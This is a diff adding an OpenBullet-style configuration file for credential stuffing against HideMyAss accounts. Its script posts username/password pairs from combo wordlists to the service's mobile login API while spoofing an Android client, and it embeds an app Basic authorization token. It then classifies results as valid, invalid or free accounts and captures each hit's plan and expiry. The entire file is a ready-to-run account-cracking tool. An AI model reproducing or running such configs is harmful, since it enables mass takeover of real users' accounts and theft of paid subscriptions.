@@ -1,0 +1,42 @@
+[SETTINGS]
+{
+  "Name": "HideMyAss",
+  "SuggestedBots": 4,
+  "LastModified": "2018-06-06T21:14:57.8212142+00:00",
+  "AdditionalInfo": "",
+  "Author": "Rebel",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://mobile.api.hmageo.com/clapi/v1.5/user/login" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G950F Build/NRD90M)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: Basic bW9iaXNvbDExMTE6a1pERVk2enMzZA==" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "{\"status\":{\"code\":257,\"msg\":\"Invalid username/password combination\"}}" 
+  KEYCHAIN Success OR 
+    KEY "{\"status\":0,\"data\":{\"user\":\"" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "\"plan\":\"\"" 
+PARSE "<SOURCE>" LR "plan\":\"" "\"" Recursive=FALSE -> CAP "Plan" "" "" 
+PARSE "<SOURCE>" LR "\"expires\":\"" "\"" Recursive=FALSE -> CAP "Expires" "" "" 
